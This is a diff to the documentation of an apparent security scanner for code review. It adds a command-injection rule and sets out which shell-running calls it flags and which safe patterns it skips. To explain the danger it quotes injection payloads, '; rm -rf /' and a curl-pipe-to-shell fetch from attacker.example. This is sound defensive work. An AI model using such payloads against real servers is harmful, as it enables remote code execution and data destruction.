@@ -9,7 +9,7 @@ Every rule is on by default. Each name links to what the rule reports, what it l
 - **Secrets:** [`secret-in-diff`](#secrets), [`credential-file`](#credential-files), [`hardcoded-jwt-secret`](#hardcoded-jwt-secrets), [`secret-logging`](#secret-logging), [`url-credentials`](#url-credentials)
 - **Supply Chain:** [`remote-script`](#remote-scripts), [`workflow-risk`](#workflow-risk), [`unpinned-action`](#unpinned-actions), [`lockfile-source`](#lockfile-sources), [`lookalike-dependency`](#lookalike-dependencies), [`risky-dependency-version`](#risky-dependency-versions), [`stale-lockfile`](#stale-lockfiles), [`dependency-risk`](#dependency-risk)
 - **Infrastructure:** [`destructive-migration`](#destructive-migrations), [`privileged-container`](#privileged-containers), [`dockerfile-risk`](#dockerfile-risk), [`public-exposure`](#public-exposure), [`insecure-infrastructure`](#insecure-infrastructure), [`kubernetes-rbac`](#kubernetes-rbac), [`file-permissions`](#file-permissions)
-- **Code:** [`disabled-security-check`](#disabled-security-checks), [`hidden-unicode`](#hidden-unicode), [`blanket-suppression`](#blanket-suppressions), [`risky-api`](#risky-apis), [`unescaped-html`](#unescaped-html), [`timing-unsafe-comparison`](#timing-unsafe-comparison), [`postmessage-origin`](#postmessage-origin), [`nosql-injection`](#nosql-injection), [`template-injection`](#template-injection), [`prototype-pollution`](#prototype-pollution), [`ldap-xpath-injection`](#ldap-and-xpath-injection), [`upload-filename`](#upload-file-names), [`reflected-xss`](#reflected-xss), [`log-injection`](#log-injection), [`static-iv`](#static-ivs), [`plaintext-password`](#plaintext-passwords), [`admin-route-auth`](#admin-route-access), [`zip-slip`](#archive-extraction), [`regex-injection`](#regular-expression-injection), [`electron-security`](#electron-security), [`unsafe-reflection`](#unsafe-reflection), [`sql-injection`](#sql-injection), [`insecure-web-config`](#insecure-web-configuration), [`weak-crypto`](#weak-cryptography), [`untrusted-input`](#untrusted-input), [`xml-external-entities`](#xml-external-entities), [`mass-assignment`](#mass-assignment), [`redos`](#regular-expression-denial-of-service)
+- **Code:** [`disabled-security-check`](#disabled-security-checks), [`hidden-unicode`](#hidden-unicode), [`blanket-suppression`](#blanket-suppressions), [`risky-api`](#risky-apis), [`unescaped-html`](#unescaped-html), [`timing-unsafe-comparison`](#timing-unsafe-comparison), [`postmessage-origin`](#postmessage-origin), [`nosql-injection`](#nosql-injection), [`template-injection`](#template-injection), [`prototype-pollution`](#prototype-pollution), [`ldap-xpath-injection`](#ldap-and-xpath-injection), [`upload-filename`](#upload-file-names), [`reflected-xss`](#reflected-xss), [`log-injection`](#log-injection), [`static-iv`](#static-ivs), [`plaintext-password`](#plaintext-passwords), [`admin-route-auth`](#admin-route-access), [`zip-slip`](#archive-extraction), [`regex-injection`](#regular-expression-injection), [`electron-security`](#electron-security), [`unsafe-reflection`](#unsafe-reflection), [`command-injection`](#command-injection), [`sql-injection`](#sql-injection), [`insecure-web-config`](#insecure-web-configuration), [`weak-crypto`](#weak-cryptography), [`untrusted-input`](#untrusted-input), [`xml-external-entities`](#xml-external-entities), [`mass-assignment`](#mass-assignment), [`redos`](#regular-expression-denial-of-service)
 - **Tests:** [`missing-tests`](#missing-tests), [`skipped-tests`](#skipped-tests)
 - **Review Scope:** [`incomplete-review`](#rules-without-options), [`large-diff`](#large-diff), [`sensitive-files`](#sensitive-files), [`config-change`](#rules-without-options), [`review-control-change`](#review-control-changes), [`oversized-patch`](#rules-without-options)
 
@@ -134,6 +134,8 @@ rules:
   electronSecurity:
     enabled: true
   unsafeReflection:
+    enabled: true
+  commandInjection:
     enabled: true
   remoteScripts:
     enabled: true
@@ -819,6 +821,32 @@ These are not reported:
 
 On about 99,000 files of library and application code, the rule reports four: mongodb-rest calling `res[req.query.output]`, next-auth calling a logger method named in the request body, NodeBB loading a theme's `theme.json` from a directory the request names, and Rails' actionable exceptions, which run `safe_constantize` on a request parameter.
 
+## Command Injection
+
+### `rules.commandInjection.enabled`
+
+The `command-injection` rule reports, as high risk, one finding per file that runs a command with a value from the request in the program it runs or in the text a shell parses. A request can then add `; rm -rf /`, `$(curl attacker.example | sh)`, or another program, and run it on the server. `risky-api` warns about every call that starts a shell; this rule reports the ones a request value reaches.
+
+| Language | Calls read |
+| --- | --- |
+| JavaScript, TypeScript | `exec`, `execSync`, `spawn`, `spawnSync`, `execFile`, `execFileSync`, as bare calls or on `child_process`, `cp`, or shelljs's `shell`, and execa's `execa` and `execaCommand`: the first argument |
+| Python | `os.system`, `os.popen`, `subprocess.getoutput`, and `subprocess.run`, `call`, `check_call`, `check_output`, and `Popen`: the first argument with `shell=True`, or a single string naming the program without it |
+| Ruby | `system`, `exec`, `spawn`, `IO.popen`, and `Open3` calls: the first argument; backticks and `%x(...)` with interpolation |
+| PHP | `exec`, `shell_exec`, `system`, `passthru`, `popen`, `proc_open`, `pcntl_exec`, and backticks |
+| Java, Kotlin | `Runtime.getRuntime().exec` and `ProcessBuilder`: every argument |
+| Go | `exec.Command`: the program, or the script of `exec.Command("sh", "-c", script)` |
+| C# | `Process.Start` and `ProcessStartInfo.Arguments` |
+
+Request values are the ones `untrusted-input` reads, and the rule follows names assigned or destructured from them within 30 lines.
+
+These are not reported:
+
+- A fixed program with the request value as a separate argument and no shell, as in `execFile("git", ["log", ref])`, `subprocess.run(["git", "log", ref])`, Ruby's `system("git", "log", ref)`, or Go's `exec.Command("ping", "-c", "1", host)`. The request then chooses an argument, not a command.
+- Values quoted for a shell, with `shlex.quote`, `escapeshellarg`, `escapeshellcmd`, `Shellwords.escape`, or `shellescape`, and values turned into numbers, with `int`, `parseInt`, `Number`, `intval`, `to_i`, `Integer.parseInt`, or `strconv.Atoi`.
+- Commands built from values that do not come from the request, other methods named `exec`, such as `pattern.exec(text)`, comment lines, documentation, TypeScript declaration files, minified files, test files matched by `rules.missingTests.testGlobs`, and fixture directories.
+
+On about 99,000 files of library and application code, the rule reports none: libraries receive commands as arguments of their own functions, which the rule does not follow.
+
 ## Disabled Security Checks
 
 ### `rules.disabledSecurityChecks.enabled`
@@ -1368,7 +1396,7 @@ When the findings in a comment come from more than one area, the comment opens t
 | Secrets | `secret-in-diff`, `credential-file`, `hardcoded-jwt-secret`, `secret-logging`, `url-credentials` |
 | Supply Chain | `remote-script`, `workflow-risk`, `unpinned-action`, `lockfile-source`, `lookalike-dependency`, `risky-dependency-version`, `stale-lockfile`, `dependency-risk` |
 | Infrastructure | `destructive-migration`, `privileged-container`, `dockerfile-risk`, `public-exposure`, `insecure-infrastructure`, `kubernetes-rbac`, `file-permissions` |
-| Code | `disabled-security-check`, `hidden-unicode`, `blanket-suppression`, `risky-api`, `unescaped-html`, `timing-unsafe-comparison`, `postmessage-origin`, `nosql-injection`, `template-injection`, `prototype-pollution`, `ldap-xpath-injection`, `upload-filename`, `reflected-xss`, `log-injection`, `static-iv`, `plaintext-password`, `admin-route-auth`, `zip-slip`, `regex-injection`, `electron-security`, `unsafe-reflection`, `sql-injection`, `insecure-web-config`, `weak-crypto`, `untrusted-input`, `xml-external-entities`, `mass-assignment`, `redos` |
+| Code | `disabled-security-check`, `hidden-unicode`, `blanket-suppression`, `risky-api`, `unescaped-html`, `timing-unsafe-comparison`, `postmessage-origin`, `nosql-injection`, `template-injection`, `prototype-pollution`, `ldap-xpath-injection`, `upload-filename`, `reflected-xss`, `log-injection`, `static-iv`, `plaintext-password`, `admin-route-auth`, `zip-slip`, `regex-injection`, `electron-security`, `unsafe-reflection`, `command-injection`, `sql-injection`, `insecure-web-config`, `weak-crypto`, `untrusted-input`, `xml-external-entities`, `mass-assignment`, `redos` |
 | Tests | `missing-tests`, `skipped-tests` |
 | Review Scope | `incomplete-review`, `large-diff`, `sensitive-files`, `config-change`, `review-control-change`, `oversized-patch` |
 
